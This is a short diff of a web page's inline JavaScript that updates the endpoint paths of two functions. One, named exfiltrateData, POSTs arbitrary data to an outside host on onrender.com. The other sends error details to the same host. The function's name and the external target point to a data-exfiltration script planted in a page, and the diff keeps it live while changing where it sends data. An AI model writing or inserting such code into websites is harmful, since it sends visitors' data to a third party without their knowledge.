@@ -8,14 +8,14 @@
 <script>
   function exfiltrateData(data) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://chocolate-7q8m.onrender.com/chocolate", true);
+    xhr.open("POST", "https://chocolate-7q8m.onrender.com/api/data", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     xhr.send("data=" + encodeURIComponent(data));
   }
 
   function reportError(errorDetails) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://chocolate-7q8m.onrender.com/error", true);
+    xhr.open("POST", "https://chocolate-7q8m.onrender.com/api/error", true);
     xhr.setRequestHeader("Content-Type", "application/json");
     xhr.send(JSON.stringify(errorDetails));
   }
